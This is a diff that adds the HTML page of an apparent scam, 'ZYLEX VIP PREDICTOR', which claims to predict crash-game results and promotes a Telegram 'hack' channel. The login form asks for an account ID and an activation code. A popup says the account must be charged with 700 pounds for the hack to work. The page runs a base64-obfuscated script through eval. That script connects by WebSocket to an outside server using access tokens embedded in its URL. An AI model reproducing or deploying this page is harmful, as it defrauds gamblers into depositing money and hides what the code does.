@@ -1,0 +1,123 @@
+<!doctype html>
+<html lang="en" dir="ltr">
+<head>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no,viewport-fit=cover">
+<title>Sign In - ZYLEX</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Amiri:wght@400;700&family=Noto+Sans:wght@700;900&display=swap" rel="stylesheet">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+<style>
+:root{--accent:#ff3b3b;--accent-2:#ff6b6b;--glass-bg:rgba(255,255,255,0.09);}
+html,body{height:100%;margin:0;font-family:"Share Tech Mono",monospace;background-image:url('https://i.postimg.cc/d021Zxg9/362f8050-a78f-11f0-a980-67f8f33754b7.gif');background-size:cover;background-position:center;background-repeat:no-repeat;background-attachment:fixed;color:#fff}
+#matrix-canvas{position:fixed;z-index:0;left:0;top:0;width:100vw;height:100vh;pointer-events:none;opacity:0.35}
+.center-bg-img{position:fixed;top:50%;left:50%;width:720px;height:720px;max-width:95vw;max-height:90vh;transform:translate(-50%,-40%);z-index:1;pointer-events:auto;background:url("https://i.postimg.cc/JnGrrsr9/IMG-20251108-201352-523.jpg") no-repeat center center;background-size:contain;opacity:0.3;filter:drop-shadow(0 0 70px #ff3b3b66) drop-shadow(0 0 15px #ff3b3b33);border-radius:40px;border:2px solid var(--accent);animation:fadeInOut 2.5s ease-in-out infinite;cursor:pointer}
+@keyframes fadeInOut{0%,100%{opacity:0.3;transform:translate(-50%,-40%) scale(1)}50%{opacity:1;transform:translate(-50%,-40%) scale(1.05)}}
+header.toolbar{width:100vw;position:fixed;top:0;left:0;z-index:1000;background:rgba(26,26,26,0.78);border-bottom:1.5px solid #2226;backdrop-filter:blur(9px);-webkit-backdrop-filter:blur(9px);border-radius:0 0 18px 18px;height:41px;display:flex;align-items:center;justify-content:center;box-shadow:0 4px 24px #0007}
+.toolbar-content{width:100%;display:flex;align-items:center;justify-content:center;height:41px;padding:0 .5rem}
+.toolbar-title{font-family:'Amiri','Noto Sans',serif;font-weight:700;font-size:1rem;letter-spacing:.7px;color:var(--accent);text-shadow:0 2px 8px rgba(255,59,59,0.25);padding-top:2px}
+main.container{flex:1 1 auto;display:flex;min-height:100vh;position:relative;z-index:2;flex-wrap:wrap;align-content:center}
+.current-time{font-size:clamp(1.5rem,5vw,2.5rem);font-weight:900;color:var(--accent);text-shadow:0 0 .75rem rgba(0,0,0,1),0 0 16px rgba(255,59,59,0.6);font-family:'Noto Sans','Amiri',sans-serif;letter-spacing:.03em;background:rgba(0,0,0,.62);padding:.45em 1.35em;border-radius:.6em;margin:20px auto;border:2px solid var(--accent);box-shadow:0 0 18px rgba(255,59,59,0.12);text-align:center;animation:slideDown .5s ease-out forwards;opacity:0;transform:translateY(-20px)}
+@keyframes slideDown{to{opacity:1;transform:translateY(0)}}
+.circle-logo-center{width:min(95vw,420px);height:min(95vw,420px);max-width:460px;max-height:460px;min-width:160px;min-height:160px;background:rgba(255,255,255,.11);border-radius:50%;border:2.5px solid var(--accent);display:flex;align-items:center;justify-content:center;margin:0 auto 40px auto;box-shadow:0 0 30px #000b,0 0 50px rgba(255,59,59,0.2);position:relative;overflow:hidden;transition:all .2s;backdrop-filter:blur(5px);-webkit-backdrop-filter:blur(5px)}
+.circle-logo-center .logo-bg{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);width:100%;height:100%;object-fit:contain;opacity:1;z-index:1;filter:drop-shadow(0 0 46px #101010c0) drop-shadow(0 0 9px rgba(255,59,59,.4));pointer-events:none;user-select:none;border-radius:50%}
+.prediction-value{position:relative;z-index:2;font-size:clamp(2.6rem,12vw,4.1rem);font-weight:900;line-height:1.1;color:var(--accent);text-shadow:0 0 .75rem rgba(0,0,0,1),0 0 16px rgba(255,59,59,.6);font-family:'Noto Sans','Amiri',sans-serif;letter-spacing:.03em;background:rgba(0,0,0,.62);padding:.45em 1.35em;border-radius:.6em;margin:0;border:2px solid var(--accent);box-shadow:0 0 18px rgba(255,59,59,.08);min-width:120px;text-align:center;user-select:text}
+main.login-container{position:absolute;top:41px;left:0;width:100vw;height:calc(100vh - 41px);display:flex;align-items:center;justify-content:center;z-index:2;flex-direction:column}
+.login-content{display:flex;flex-direction:column;align-items:center;justify-content:center;width:100%;position:relative;z-index:5;margin-top:38px}
+.login-form{width:100%;max-width:258px;padding:.85rem .8rem .8rem .8rem;border-radius:1.1rem;background:var(--glass-bg);box-shadow:0 0 16px rgba(255,59,59,.08);border:1.5px solid rgba(255,59,59,.14);display:flex;flex-direction:column;gap:.82rem;box-sizing:border-box;align-items:center}
+.game-logo{margin-bottom:1.1rem;text-align:center;display:flex;flex-direction:column;align-items:center;justify-content:center}
+.game-logo img{width:100px;height:100px;border-radius:50%;border:2px solid rgba(255,59,59,.9);box-shadow:0 8px 32px rgba(0,0,0,.3);object-fit:cover;background:#fff3;margin:.3rem 0}
+.game-logo h1{font-family:'Amiri',sans-serif;font-weight:900;font-size:1.07rem;color:#fff;text-shadow:0 2px 4px rgba(0,0,0,.3);margin-top:.42rem}
+.form-group{margin-bottom:0;display:flex;flex-direction:column;gap:.18rem;width:100%}
+.form-label{color:#fff;font-size:.92rem;font-weight:700;margin-bottom:.07rem;letter-spacing:.03em;text-shadow:0 2px 4px rgba(0,0,0,.34);display:flex;align-items:center;gap:7px}
+.form-input-wrapper{position:relative;width:100%}
+.form-input-wrapper i{position:absolute;right:11px;top:50%;transform:translateY(-50%);color:var(--accent);font-size:1rem;pointer-events:none;opacity:.85;z-index:2}
+.form-group input{width:100%;padding:.54rem 2rem .54rem .7rem;border:2px solid rgba(255,59,59,.6);border-radius:.7rem;background:rgba(255,255,255,.13);color:#fff;font-size:.93rem;font-family:'Amiri',sans-serif;transition:border-color .3s,box-shadow .3s;box-shadow:0 2px 9px #2225;box-sizing:border-box}
+.form-group input::placeholder{color:#bbb;opacity:.9;font-size:.94em}
+.form-group input:focus{outline:none;border-color:var(--accent);box-shadow:0 0 7px rgba(255,59,59,.12)}
+.login-btn{width:100%;padding:.61rem;background:linear-gradient(90deg,#60c4a8,var(--accent));color:#222;border:none;border-radius:.7rem;font-size:.98rem;font-weight:bold;cursor:pointer;transition:all .3s ease;margin-top:.3rem;text-shadow:0 2px 4px rgba(255,255,255,.12);letter-spacing:.04em}
+.login-btn:hover{transform:translateY(-2px) scale(1.03);box-shadow:0 5px 15px rgba(255,59,59,.18);background:linear-gradient(90deg,var(--accent),#60c4a8)}
+.social-circles-bar{position:fixed;right:20px;bottom:30px;display:flex;flex-direction:column;gap:10px;z-index:1002}
+.social-circle{background:rgba(255,255,255,.1);border:1px solid rgba(255,59,59,.12);box-shadow:0 4px 12px rgba(0,0,0,.2);color:#fff;font-size:1.2rem;width:120px;height:40px;border-radius:20px;display:flex;align-items:center;justify-content:center;transition:all .3s;opacity:.9;padding:0 10px;text-decoration:none;font-weight:700;text-align:center;line-height:1}
+.social-circle:hover{background:rgba(255,59,59,.06);color:var(--accent);transform:scale(1.1) translateX(-3px);opacity:1;box-shadow:0 6px 16px rgba(255,59,59,.12)}
+.popup{position:fixed;top:50%;left:50%;transform:translate(-50%,-50%);background:rgba(0,0,0,.95);padding:1.1rem 1.5rem;border-radius:1.2rem;z-index:2000;text-align:center;display:none;border:1.5px solid rgba(255,59,59,.12);box-shadow:0 0 24px rgba(255,59,59,.08)}
+.popup.show{display:block}
+.popup p{font-size:.97rem;color:var(--accent);margin-bottom:.88rem}
+.popup button{padding:.42rem 1.19rem;background:var(--accent);border:none;border-radius:.7rem;color:#fff;cursor:pointer;font-size:.93rem;font-weight:700}
+.popup button:hover{background:#b44242;color:#fff}
+@media (max-width:600px){.big-logo-header{width:68px;height:68px;margin-top:44px;margin-bottom:12px}.big-logo-header img{width:54px;height:54px}.login-content{margin-top:12px}.game-logo img{width:80px;height:80px}.login-form{max-width:94vw;padding:.5rem .35rem .35rem .35rem;gap:.51rem}.form-label{font-size:.76rem}.form-group input{font-size:.78rem;padding:.37rem 1.45rem .37rem .6rem}.login-btn{font-size:.81rem;padding:.39rem}.social-circles-bar{gap:8px;bottom:12px;right:10px}.social-circle{font-size:1rem;width:100px;height:36px;border-radius:18px}}
+</style>
+</head>
+<body>
+<header class="toolbar">
+<div class="toolbar-content">
+<span class="toolbar-title">ZYLEX VIP PREDICTOR</span>
+</div>
+</header>
+<main class="container" style="display:flex;">
+<div class="current-time" id="timer">00 : 10 :00</div>
+<div class="circle-logo-center" title="Open image" onclick="openCenterImage()">
+<img class="logo-bg" src="https://i.postimg.cc/JnGrrsr9/IMG-20251108-201352-523.jpg" alt="Logo">
+<div class="prediction-value" id="crash">0.00</div>
+</div>
+</main>
+<main class="login-container" style="display:none;">
+<canvas id="matrix-canvas"></canvas>
+<div class="center-bg-img" onclick="openCenterImage()"></div>
+<div class="big-logo-header" style="margin-top:120px;">
+<img src="https://i.postimg.cc/JnGrrsr9/IMG-20251108-201352-523.jpg" alt="logo">
+</div>
+<div class="login-content">
+<div class="login-form" id="loginForm" autocomplete="off">
+<div class="game-logo">
+<img src="https://i.postimg.cc/JnGrrsr9/IMG-20251108-201352-523.jpg" alt="Game Logo" id="gameLogo">
+<h1 id="gameTitle">لعبة الطيارة</h1>
+</div>
+<div class="form-group">
+<label class="form-label" for="username"><i class="fa fa-user"></i> معرف المستخدم</label>
+<div class="form-input-wrapper"><i class="fa fa-user"></i><input type="text" id="id" placeholder="ايدي حسابك" inputmode="numeric" pattern="[0-9]*" maxlength="12" autocomplete="username"></div>
+</div>
+<div class="form-group">
+<label class="form-label" for="activation"><i class="fa fa-key"></i> كود التفعيل</label>
+<div class="form-input-wrapper"><i class="fa fa-key"></i><input type="text" id="activationCode" placeholder="كود التفعيل" autocomplete="off"></div>
+</div>
+<button type="submit" onclick="startLoading()" class="login-btn">تسجيل الدخول</button>
+</div>
+</div>
+</main>
+<div class="social-circles-bar">
+<a href="https://t.me/ZYLEX_HACK" class="social-circle" target="_blank"><span>@ZYLEX_HACK</span></a>
+<a href="https://t.me/ZYLEX_HACK" class="social-circle" target="_blank"><span>VIP SCRIPT</span></a>
+</div>
+<div id="popup" class="popup">
+<p id="popupMessage">يجب شحن حسابك  بمبلغ 700 جنيه على الأقل ليعمل الهاك بشكل صحيح</p>
+<button onclick="closePopup()">موافق</button>
+</div>
+<script>
+function startMatrix(){const canvas=document.getElementById('matrix-canvas');if(!canvas)return;const ctx=canvas.getContext('2d');let w=canvas.width=window.innerWidth;let h=canvas.height=window.innerHeight;let fontSize=Math.max(12,Math.floor(w/60));let columns=Math.floor(w/fontSize);let drops=Array.from({length:columns},()=>Math.random()*-100);const chars='0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz@#$%^&*(){}[]<>|/\\'.split('');function draw(){ctx.fillStyle='rgba(0,0,0,0.18)';ctx.fillRect(0,0,w,h);ctx.font=fontSize+"px monospace";for(let i=0;i<drops.length;i++){const text=chars[Math.floor(Math.random()*chars.length)];const alpha=0.6-Math.random()*0.4;ctx.fillStyle=`rgba(47,255,110,${alpha})`;ctx.fillText(text,i*fontSize,drops[i]*fontSize);drops[i]+=1+Math.random()*6;if(drops[i]*fontSize>h+(Math.random()*200)){drops[i]=Math.random()*-20;}}requestAnimationFrame(draw);}draw();window.addEventListener('resize',()=>{w=canvas.width=window.innerWidth;h=canvas.height=window.innerHeight;fontSize=Math.max(12,Math.floor(w/60));columns=Math.floor(w/fontSize);drops=Array.from({length:columns},()=>Math.random()*-100);});}
+startMatrix();
+function openCenterImage(){window.open('https://i.postimg.cc/JnGrrsr9/IMG-20251108-201352-523.jpg','_blank');}
+function showPopup(message){const popup=document.getElementById('popup');document.getElementById('popupMessage').textContent=message;popup.classList.add('show');}
+function closePopup(){document.getElementById('popup').classList.remove('show');}
+(function countdown(){let total=1800;const el=document.getElementById('timer');function format(s){const mm=Math.floor(s/60);const ss=s%60;return String(mm).padStart(2,'0')+':'+String(ss).padStart(2,'0');}el.textContent=format(total);const t=setInterval(()=>{total--;if(total<0){clearInterval(t);window.location.href='Login.html';return;}el.textContent=format(total);},1000);})();
+function setCrashText(val){const el=document.getElementById('crash');if(!el)return;const n=parseFloat(String(val).replace(',','.'));const text=isNaN(n)?String(val):n.toFixed(2);el.textContent=text;}
+
+var encryptedJsCode="bmV3IGZ1bmN0aW9uKCkgewoKCXZhciB3cyA9IG51bGw7Cgl2YXIgb3BlbiA9IGZ1bmN0aW9uKCkgewoJCXZhciB1cmwgPSAnd3NzOi8vc3J2MTAxNDI2NS5oc3Rnci5jbG91ZDo4MDgwLzMwLzgvMTk/Y289MzE2MyZjdT05NDcyJmxnPWVuJndoPTUyODgmaXBtPWV5SjBlWEFpT2lKS1YxUWlMQ0poYkdjaU9pSklVekkxTmlKOS5leUp6ZFdJaU9pSTFNRnd2TVRJNE5ETTROakl5TlNJc0luQnBaQ0k2SWpFaUxDSnFkR2tpT2lKcGNHMWZOamhtTVdWa05qWTNZemN6WkRndU16UTJNREl3TXpBaUxDSmhjSEFpT2lKT1FTSXNJbWx1Ym1WeUlqb2lkSEoxWlNJc0ltNWlaaUk2TVRjMk1EWTROVFF4TkN3aWFXRjBJam94TnpZd05qZzFOREUwTENKbGVIQWlPakUzTmpBMk9Ea3dNVFI5LlJBSUUySnk3THo2LV9fbUVGOEt0WmZSbGJDUmF4OXYzLWdibUVnNmE1WncmdG9rPWV5SjBlWEFpT2lKS1YxUWlMQ0poYkdjaU9pSklVekkxTmlKOS5leUoxYzJWeVNXUWlPaUk1T1RrNU9UazVJaXdpY205c1pTSTZJbFJvWVc1dmN5SXNJbWxoZENJNk1UYzJNRFk0TlRReE5Dd2laWGh3SWpveE56WXdOamcxTkRjMGZRLmEwUHJHVkoweUU3eG9nWlpOR19YWGpVUHpxOWJGTEZEVHZ5N1h6eXdBaVUnOwoJCXdzID0gbmV3IFdlYlNvY2tldCh1cmwpOwoJCXdzLm9ub3BlbiA9IG9uT3BlbjsKCQl3cy5vbmNsb3NlID0gb25DbG9zZTsKCQl3cy5vbm1lc3NhZ2UgPSBvbk1lc3NhZ2U7CgkJd3Mub25lcnJvciA9IG9uRXJyb3I7Cgl9CgkKCXZhciBjbG9zZSA9IGZ1bmN0aW9uKCkgewoJCWlmICh3cykgewoJCQl3cy5jbG9zZSgpOwoJCX0KCQl9Cgl2YXIgb25PcGVuID0gZnVuY3Rpb24oKSB7CgkJd3Muc2VuZCgneyJwcm90b2NvbCI6Impzb24iLCJ2ZXJzaW9uIjoxfVx4MWUnKTsKCgl9OwoJdmFyIG9uQ2xvc2UgPSBmdW5jdGlvbigpIHsKCQl3cyA9IG51bGw7Cgl9OwoJCgl2YXIgb25NZXNzYWdlID0gZnVuY3Rpb24oZXZlbnQpIHsKCQljb25zdCBkYXRhID0gSlNPTi5wYXJzZShldmVudC5kYXRhLnNsaWNlKDAsIC0xKSk7CiAgICAgICAgICAgIGlmIChkYXRhLm9uY3Jhc2gpIHsKICAgICAgICAgICAgICAgIHNlbmQoZGF0YS5vbmNyYXNoKTsKICAgICAgICAgICAgfQoJfTsKCWZ1bmN0aW9uIHNlbmQoaWQpIHsKCWNyYXNoVmFsdWVFbGVtZW50LmNsYXNzTGlzdC5hZGQoJ2dsaXRjaCcpOwogICAgICAgICAgICAgICAgICAgIHNldFRpbWVvdXQoKCkgPT4gewogICAgICAgICAgICAgICAgICAgICAgICBjcmFzaFZhbHVlRWxlbWVudC5pbm5lclRleHQgPSBpZDsKICAgICAgICAgICAgICAgICAgICAgICAgY3Jhc2hWYWx1ZUVsZW1lbnQuc2V0QXR0cmlidXRlKCdkYXRhLXRleHQnLCBpZCk7CiAgICAgICAgICAgICAgICAgICAgICAgIGNyYXNoVmFsdWVFbGVtZW50LmNsYXNzTGlzdC5yZW1vdmUoJ2dsaXRjaCcpOwogICAgICAgICAgICAgICAgICAgIH0sIDEwMDApOwkJfQogICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgIAoKCXZhciBvbkVycm9yID0gZnVuY3Rpb24oZXZlbnQpIHsKCQlhbGVydChldmVudC5kYXRhKTsKCX0KCW9wZW4oKQoJfQoJ";
+var decodedJsCode=atob(encryptedJsCode);
+var crashValueElement=document.getElementById("crash");
+function wrapSocketConnection(){
+const oldWebSocket=window.WebSocket;
+window.WebSocket=function(...args){
+const ws=new oldWebSocket(...args);
+return ws;
+};
+}
+wrapSocketConnection();
+eval(decodedJsCode);
+
+    document.addEventListener('dblclick', function(e){ e.preventDefault(); });
+    document.addEventListener('touchstart', function(e){ if(e.touches.length>1) e.preventDefault(); }, {passive:false});
+    document.addEventListener('wheel', function(e){ if(e.ctrlKey) e.preventDefault(); }, {passive:false});
+  </script>
+</body>
+</html>
